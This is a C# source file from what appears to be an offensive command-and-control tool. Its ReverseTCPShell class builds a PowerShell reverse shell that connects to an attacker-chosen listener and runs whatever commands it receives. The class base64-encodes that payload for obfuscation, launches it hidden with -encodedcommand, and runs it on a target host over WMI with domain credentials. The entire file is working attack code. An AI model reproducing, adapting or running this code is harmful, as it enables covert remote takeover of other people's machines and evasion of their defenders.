using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Neko.Command_and_Control
{
    class ReverseTCPShell
    {
        public static void Control()
        {
            // Confirm that user wants to launch reverse shell
            Console.WriteLine("\r\n" +
                "Launch reverse TCP shell to specified target? Enter 'y' or 'n':");
            string c2Choice = Console.ReadLine();
            while (c2Choice != "y" && c2Choice != "n")
            {
                Console.WriteLine("Invalid selection. Launch reverse TCP shell to specified target? Enter 'y' or 'n':");
            }
            if (c2Choice == "y")
            {
                // Get IP for target
                Console.WriteLine("\r\nPlease enter IP address for target: ");
                string targetIP = Console.ReadLine();
                // Check if target IP is valid
                if (Information.Subnet.ValidateIP(targetIP) == false)
                {
                    Console.WriteLine("\r\nInvalid IP. Please enter valid IP address: ");
                    targetIP = Console.ReadLine();
                }

                Console.WriteLine("\r\nEnter listener IP: ");
                string listenerIP = Console.ReadLine();
                // Check if listener IP is valid
                if (Information.Subnet.ValidateIP(listenerIP) == false)
                {
                    Console.WriteLine("\r\nInvalid IP. Please enter valid IP address: ");
                    listenerIP = Console.ReadLine();
                }
                // Get port choice from user
                Console.WriteLine("\r\r\nEnter port for communication. Leave blank for default (port 80):");
                string reversePort = Console.ReadLine();

                if (reversePort == "")
                {
                    reversePort = "80";
                }

                string reverseShell = @"$client=New-Object System.Net.Sockets.TCPClient('" + listenerIP + @"'," + reversePort + @");$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes, 0, $bytes.Length)) -ne
                        0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback + 'PS ' +
                        (pwd).Path + '> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";

                Console.WriteLine("\r\n" +
                        "Encoding commands for obfuscation");

                byte[] encoded = Encoding.Unicode.GetBytes(reverseShell);
                string obfuscatedCommand = Convert.ToBase64String(encoded);

                string commandLine = "cmd.exe /c powershell -windowstyle hidden -noprofile -noninteractive -encodedcommand " + obfuscatedCommand;
                User_Selections.WMIAttack.Parameters(DomainAuthentication.Username, DomainAuthentication.Password, GetDomainInfo.DomainURL, targetIP, commandLine);
            }
        }
    }
}
